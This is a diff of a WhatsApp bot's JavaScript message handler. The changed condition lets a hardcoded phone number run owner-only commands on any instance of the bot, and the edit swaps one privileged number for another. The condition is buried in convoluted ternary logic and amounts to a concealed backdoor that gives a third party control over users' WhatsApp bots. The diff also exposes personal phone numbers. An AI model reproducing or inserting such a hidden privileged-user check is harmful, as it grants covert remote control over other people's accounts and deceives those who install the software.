@@ -377,8 +377,8 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
-                    if ((PROP2.kl11 == "919074309534,0" && msg.key.fromMe === false && command.fromMe === true &&
-                        (msg.participant && PROP2.kl11.includes(',') ? PROP2.kl11.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == PROP2.kl11 || PROP2.kl11.includes(',') ? PROP2.kl11.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == PROP2.kl11)
+                    if ((PROP2.vishnuser == "916235989299,0" && msg.key.fromMe === false && command.fromMe === true &&
+                        (msg.participant && PROP2.vishnuser.includes(',') ? PROP2.vishnuser.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == PROP2.vishnuser || PROP2.vishnuser.includes(',') ? PROP2.vishnuser.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == PROP2.vishnuser)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
